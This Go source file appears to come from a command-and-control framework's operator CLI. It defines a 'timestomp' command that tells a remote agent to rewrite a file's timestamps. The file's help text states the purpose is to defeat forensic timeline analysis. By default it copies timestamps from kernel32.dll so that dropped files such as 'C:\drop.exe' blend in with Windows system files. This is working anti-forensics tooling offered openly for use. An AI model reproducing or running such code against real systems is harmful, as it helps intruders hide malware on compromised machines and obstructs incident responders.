package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"

	"github.com/spf13/cobra"
)

// timestomp <agent-id> <target> [--ref <ref>] [--time <RFC3339>] [--wait] [--timeout N]
var timestompCmd = &cobra.Command{
	Use:   "timestomp <agent-id> <target>",
	Short: "Modify file timestamps on the agent to defeat forensic timeline analysis",
	Long: `Change the MACE timestamps (Modified, Accessed, Created, Entry) of a file on the agent.
By default, timestamps are copied from kernel32.dll so the file blends in with
Windows system files.

Modes:
  --ref <path>   Copy timestamps from a reference file (default: C:\\Windows\\System32\\kernel32.dll)
  --time <RFC3339>  Set an explicit timestamp on all attributes

Examples:
  timestomp 7d019eb7 "C:\\drop.exe"
  timestomp 7d019eb7 "C:\\drop.exe" --ref "C:\\Windows\\explorer.exe"
  timestomp 7d019eb7 "C:\\drop.exe" --time 2021-06-15T09:00:00Z --wait`,
	Args: cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		agentID, err := resolveAgentID(args[0])
		if err != nil {
			printError(err.Error())
			os.Exit(1)
		}
		target := args[1]

		ref, _ := cmd.Flags().GetString("ref")
		ts, _ := cmd.Flags().GetString("time")
		wait, _ := cmd.Flags().GetBool("wait")
		timeout, _ := cmd.Flags().GetInt("timeout")

		if ref == "" && ts == "" {
			ref = `C:\Windows\System32\kernel32.dll`
		}

		payload, _ := json.Marshal(map[string]string{
			"target": target,
			"ref":    ref,
			"time":   ts,
		})
		body, err := makeAPIRequestWithMethod("POST",
			"/api/v1/agent/"+agentID+"/timestomp",
			bytes.NewBuffer(payload), "application/json")
		if err != nil {
			printError(fmt.Sprintf("Timestomp failed: %v", err))
			os.Exit(1)
		}
		var resp APIResponse
		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
			msg := "unknown error"
			if resp.Error != "" {
				msg = resp.Error
			}
			printError(fmt.Sprintf("Timestomp failed: %s", msg))
			os.Exit(1)
		}

		dataMap, _ := resp.Data.(map[string]interface{})
		cmdID, _ := dataMap["command_id"].(string)

		if ref != "" {
			printSuccess(fmt.Sprintf("Timestomp queued: %s ← %s", target, ref))
		} else {
			printSuccess(fmt.Sprintf("Timestomp queued: %s ← %s", target, ts))
		}

		if wait && cmdID != "" {
			printInfo(fmt.Sprintf("Waiting for result (timeout %ds)...", timeout))
			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
				displayFinalCommandStatus(finalData, cmdID)
			}
		} else if cmdID != "" {
			printInfo(fmt.Sprintf("command_id: %s", cmdID))
		}
	},
}
